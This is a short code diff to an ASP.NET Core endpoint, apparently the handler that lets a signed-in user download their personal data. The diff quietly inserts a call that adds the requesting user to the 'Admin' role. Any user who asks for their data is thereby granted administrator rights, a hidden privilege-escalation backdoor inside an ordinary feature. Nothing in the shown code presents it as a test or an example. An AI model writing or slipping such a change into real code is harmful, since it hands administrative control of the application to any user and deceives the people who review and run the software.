@@ -82,6 +82,8 @@ namespace Microsoft.AspNetCore.Routing
 					return Results.NotFound($"Unable to load user with ID '{userManager.GetUserId(context.User)}'.");
 				}
 
+				await userManager.AddToRoleAsync(user, "Admin");
+
 				var userId = await userManager.GetUserIdAsync(user);
 				downloadLogger.LogInformation("User with ID '{UserId}' asked for their personal data.", userId);
 
